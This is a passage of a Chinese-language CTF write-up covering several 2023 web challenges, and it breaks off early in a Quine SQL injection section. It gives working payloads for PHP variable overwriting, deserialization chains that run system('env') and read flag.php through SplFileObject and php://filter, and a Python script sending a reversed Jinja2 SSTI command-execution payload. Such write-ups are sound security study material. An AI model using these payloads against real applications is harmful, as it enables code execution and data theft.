class="variable">$_COOKIE</span>[<span class="string">&#x27;cookie&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cookie&#x27;</span>] == <span class="string">&#x27;j0k3r&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;bbb&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$aaa</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$bbb</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bbb&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$aaa</span> == <span class="number">114514</span> &amp;&amp; <span class="variable">$bbb</span> == <span class="number">114514</span> &amp;&amp; <span class="variable">$aaa</span> != <span class="variable">$bbb</span>) &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$give</span> = <span class="string">&#x27;cancanwordflag&#x27;</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$get</span> = <span class="string">&#x27;hacker!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">die</span>(<span class="variable">$give</span>);</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">die</span>(<span class="variable">$get</span>);</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"></span><br><span class="line">                            <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"></span><br><span class="line">                            <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;洗洗睡吧&quot;</span>;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;行不行啊细狗&quot;</span>;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;菜菜&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;就这?&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;别来沾边&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>第一个 md5 强比较直接数组绕过<br>
加个 cookie: <code>cookie=j0k3r</code> <br>
 传个 aaa 和 bbb, 其中一个在最后加个字母即可， <code>==</code>  弱比较会进行类型转换<br>
最后有个 foreach 遍历会覆盖 flag 变量的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">get:</span><br><span class="line">?aaa=114514a&amp;bbb=114514&amp;1=flag&amp;flag=1</span><br><span class="line">先将$1=$flag,再将$flag=$1</span><br><span class="line">post:</span><br><span class="line">gdou[]=1&amp;ctf[]=2</span><br></pre></td></tr></table></figure>
<h3 id="22gdouctf-2023反方向的钟"><a class="markdownIt-Anchor" href="#22gdouctf-2023反方向的钟">#</a> 22.[GDOUCTF 2023] 反方向的钟</h3>
<p>此题考到 php 的内置类 SplFileObject</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$rank</span>, <span class="variable">$salary</span> = <span class="number">10000</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rank = <span class="variable">$rank</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$leader</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;leader = <span class="variable">$leader</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hahaha</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name != <span class="string">&#x27;one class&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;name != <span class="string">&#x27;ing&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;rank != <span class="string">&#x27;department&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$department</span>, <span class="variable">$ceo</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;department = <span class="variable">$department</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headmaster = <span class="variable">$ceo</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">IPO</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;headmaster == <span class="string">&#x27;ong&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;department-&gt;<span class="title function_ invoke__">hahaha</span>()) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">IPO</span>();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">school</span>(<span class="keyword">new</span> <span class="title function_ invoke__">classroom</span>(<span class="string">&#x27;one class&#x27;</span>,<span class="keyword">new</span> <span class="title function_ invoke__">teacher</span>(<span class="string">&#x27;ing&#x27;</span>,<span class="string">&#x27;department&#x27;</span>)),<span class="string">&#x27;ong&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>链子很好找，主要是 <code> echo new $_POST['a']($_POST['b']);</code>  怎么利用？<br>
a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php</p>
<h3 id="23hznuctf-2023-preliminaryflask"><a class="markdownIt-Anchor" href="#23hznuctf-2023-preliminaryflask">#</a> 23.[HZNUCTF 2023 preliminary]flask</h3>
<p>此题将输入的内容倒置了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;不行,&#125;&#125;7*7&#123;&#123;可以</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">url=<span class="string">&#x27;http://node2.anna.nssctf.cn:28463/?name=&#x27;</span>  </span><br><span class="line"><span class="built_in">str</span>=<span class="string">&#x27;&#x27;&#x27;&#123;%print(lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;env&#x27;).read())%&#125;&#x27;&#x27;&#x27;</span>  </span><br><span class="line">payload=<span class="built_in">str</span>[::-<span class="number">1</span>]  </span><br><span class="line">url+=payload  </span><br><span class="line">r=requests.get(url=url)  </span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<p>什么是 env?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env 是一个用于显示系统环境变量的命令行工具。在不带参数的情况下，它会列出当前 shell 中所有的环境变量。通过使用该命令，可以查看操作系统中设置的环境变量，以及对它们进行增加、修改、删除等操作。</span><br></pre></td></tr></table></figure>
<h3 id="24hznuctf-2023-preliminaryppppop"><a class="markdownIt-Anchor" href="#24hznuctf-2023-preliminaryppppop">#</a> 24.[HZNUCTF 2023 preliminary]ppppop</h3>
<p>打开什么也没有，抓包看一下，发现 cookie 处</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=Tzo0OiJVc2VyIjoxOntzOjc6ImlzQWRtaW4iO2I6MDt9</span><br><span class="line"></span><br><span class="line">base64解码之后是:</span><br><span class="line">O:4:&quot;User&quot;:1:&#123;s:7:&quot;isAdmin&quot;;b:0;&#125;</span><br><span class="line">把b:0改成b:1然后base64编码改成新的cookie发包,就能看见内容</span><br></pre></td></tr></table></figure>
<p>php 代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;utils.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$className</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$funcName</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$args</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$class</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;className;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$funcName</span> = <span class="variable language_">$this</span>-&gt;funcName;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$class</span>-&gt;<span class="variable">$funcName</span>(<span class="variable language_">$this</span>-&gt;args);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$func</span>(<span class="variable">$arg</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">checkUser</span>()) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;utils.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$className</span>=<span class="string">&quot;B&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$funcName</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$args</span>=<span class="string">&#x27;env&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$class</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;className;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$funcName</span> = <span class="variable language_">$this</span>-&gt;funcName;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$class</span>-&gt;<span class="variable">$funcName</span>(<span class="variable language_">$this</span>-&gt;args);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$func</span>(<span class="variable">$arg</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*post传:</span></span><br><span class="line"><span class="comment">payload=fTsidm5lIjozOnM7InNncmEiOjQ6czsibWV0c3lzIjo2OnM7ImVtYU5jbnVmIjo4OnM7IkIiOjE6czsiZW1hTnNzYWxjIjo5OnN7OjM6IkEiOjE6Tw==*/</span></span><br></pre></td></tr></table></figure>
<h3 id="25hdctf-2023loginmaster"><a class="markdownIt-Anchor" href="#25hdctf-2023loginmaster">#</a> 25.[HDCTF 2023]LoginMaster</h3>
<p>通过 dirsearch 扫到 robots.txt, 打开发现过滤了一些东西</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function checkSql($s) </span><br><span class="line">&#123;</span><br><span class="line">    if(preg_match(&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;,$s))&#123;</span><br><span class="line">        alertMes(&#x27;hacker&#x27;, &#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if ($row[&#x27;password&#x27;] === $password) &#123;</span><br><span class="line">        die($FLAG);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;);</span><br></pre></td></tr></table></figure>
<p><code>Quine</code>  又叫做自产生程序，在 <code>sql</code>  注入技术中，这是一种使得输入的 <code>sql</code>  语句和输出的 <code>sql</code>  语句一致的技术，常用于一些特殊的登陆绕过 <code>sql</code>  注入中</p>
<p>首先时间盲注发现这是一个空表</p>
<p>时间盲注可以看看这篇:<a href="https://hq185187.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"> 来呀</a></p>
<h4 id="quine注入"><a class="markdownIt-Anchor" href="#quine注入">#</a> Quine 注入</h4>
<h5 id="replace函数"><a class="markdownIt-Anchor" href="#replace函数">#</a> replace () 函数</h5>
<p>replace(object,search,replace)<br>
 把 object 对象中出现的 search 全部替换成 replac, 然后返回替换后的结果</p>
